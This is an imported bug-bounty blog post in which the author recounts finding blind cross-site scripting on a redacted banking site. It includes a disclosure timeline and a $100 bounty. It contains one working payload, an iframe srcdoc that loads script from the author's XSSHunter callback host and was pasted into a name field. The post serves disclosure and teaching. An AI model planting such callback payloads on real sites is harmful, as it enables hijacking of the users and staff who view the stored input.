---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-11-03_get-blind-xss-within-5-minutes-100.md
original_filename: 2022-11-03_get-blind-xss-within-5-minutes-100.md
title: Get Blind XSS within 5 Minutes — $100
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: c04694c30619c97aefb010920b490578a2345a4c002a162de94d45584275da6d
text_sha256: bc87429d74c09e5b681ebff3b734ee5caf9a4e90848ede2db962a5d11ff11067
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# Get Blind XSS within 5 Minutes — $100

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-11-03_get-blind-xss-within-5-minutes-100.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `c04694c30619c97aefb010920b490578a2345a4c002a162de94d45584275da6d`
- Text SHA256: `bc87429d74c09e5b681ebff3b734ee5caf9a4e90848ede2db962a5d11ff11067`


## Content

---
title: "Get Blind XSS within 5 Minutes — $100"
url: "https://infosecwriteups.com/get-blind-xss-within-5-minutes-100-9718bd056570"
authors: ["Narayanan M"]
bugs: ["Blind XSS"]
bounty: "100"
publication_date: "2022-11-03"
added_date: "2022-11-05"
source: "pentester.land/writeups.json"
original_index: 1955
scraped_via: "browseros"
---

# Get Blind XSS within 5 Minutes — $100

Get Blind XSS within 5 Minutes — $100
Narayanan M
Follow
2 min read
·
Nov 3, 2022

106

1

Hello Boss….

I am Narayanan M and this is my first blog on infosecwriteups. Today I will explain how I found Blind XSS on a banking site.

I found the redacted.com when I was looking for a bug bounty program. In the event of a valid submission, redacted.com will award a bounty in accordance with CVSS. So I decided to give it a try.

#What is Blind XSS
Blind XSS is a flavor of cross-site scripting (XSS), where the attacker “blindly” deploys a series of malicious payloads on web pages that are likely to save them to a persistent state (like in a database, or a log file).

Let’s Hunt…

I quickly copied my XSSHunter payload [<iframe/srcdoc=”<script/src=//narayananm.xss.ht></script>”>] and pasted on name field. After few minutes, I received the following mail.

Press enter or click to view image in full size

Yes! Our payload is executed….
Tip: Always check all input field

Get Narayanan M’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Then I sent them a decent proof of concept. Next day, got a response from them to submit a video (POC) for better understanding. Again I create the video and sent it to them. A few days later, I received an email from them (the team has confirmed the fix. Can you check and update us?).

When I try to reproduce the issue, I can’t! That means the vulnerability has been successfully fixed.

Again a few days later I got an email from them and yes! It’s a bounty time.

Timeline:

Oct 6th — Vulnerability Reported
Oct 7th — Got a response from the team
Oct 17th — Vulnerability Fixed
Oct 27th — Retesting
Nov 3rd — Bounty Awarded ($100)

Twitter: https://twitter.com/itsnarayananm
Instagram: https://www.instagram.com/rootx_narayanan/
LinkedIn: https://www.linkedin.com/in/narayanan-m-836197199/

Peace…

From Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. Join our weekly newsletter to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 GitHub Repos and tools, and 1 job alert for FREE!
